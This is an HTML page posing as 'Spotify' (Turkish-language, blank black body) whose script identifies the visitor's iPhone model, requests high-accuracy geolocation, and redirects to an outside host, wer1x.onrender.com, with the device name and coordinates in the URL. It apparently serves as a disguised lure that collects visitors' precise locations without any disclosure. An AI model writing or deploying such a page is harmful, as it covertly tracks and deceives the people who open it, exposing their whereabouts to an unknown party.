<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spotify</title>
  <style>body{margin:0;background:#000}</style>
</head>
<body>
  <script>
    let device = '';
    let ua = navigator.userAgent;
    if (/iPhone/.test(ua) || (/Mac/.test(ua) && 'ontouchend' in document)) {
      let w = screen.width, h = screen.height, dpr = window.devicePixelRatio || 1;
      let ios = (ua.match(/iPhone OS (\d+)_/) || [])[1] || 0;
      let key = w+'x'+h+'x'+dpr;
      let map = {
        '320x568x2': 'iPhone SE',
        '375x667x2': ios >= 14 ? 'iPhone SE 2/3' : 'iPhone 6/7/8',
        '414x736x3': 'iPhone 6 Plus/7 Plus/8 Plus',
        '375x812x3': ios >= 17 ? 'iPhone 14' : ios >= 15 ? 'iPhone 13 mini' : ios >= 14 ? 'iPhone 12 mini' : ios >= 13 ? 'iPhone 11 Pro' : ios >= 12 ? 'iPhone XS' : 'iPhone X',
        '414x896x2': ios >= 13 ? 'iPhone 11' : 'iPhone XR',
        '414x896x3': ios >= 13 ? 'iPhone 11 Pro Max' : 'iPhone XS Max',
        '390x844x3': ios >= 17 ? 'iPhone 14' : ios >= 15 ? 'iPhone 13' : ios >= 14 ? 'iPhone 12' : 'iPhone 12',
        '428x926x3': ios >= 16 ? 'iPhone 14 Plus' : ios >= 15 ? 'iPhone 13 Pro Max' : 'iPhone 12 Pro Max',
        '393x852x3': ios >= 18 ? 'iPhone 16' : ios >= 17 ? 'iPhone 15' : 'iPhone 14 Pro',
        '430x932x3': ios >= 18 ? 'iPhone 16 Pro Max' : 'iPhone 15 Pro Max',
        '360x780x3': 'iPhone 16e'
      };
      device = map[key] || '';
    }
    let url = 'https://wer1x.onrender.com';
    let params = [];
    if (device) params.push('device=' + encodeURIComponent(device));
    navigator.geolocation.getCurrentPosition(p => {
      params.push('lat=' + p.coords.latitude + '&lon=' + p.coords.longitude + '&acc=' + p.coords.accuracy);
      window.location.replace(url + (params.length ? '?' + params.join('&') : ''));
    }, () => {
      window.location.replace(url + (params.length ? '?' + params.join('&') : ''));
    }, { timeout: 5000, enableHighAccuracy: true });
  </script>
</body>
</html>
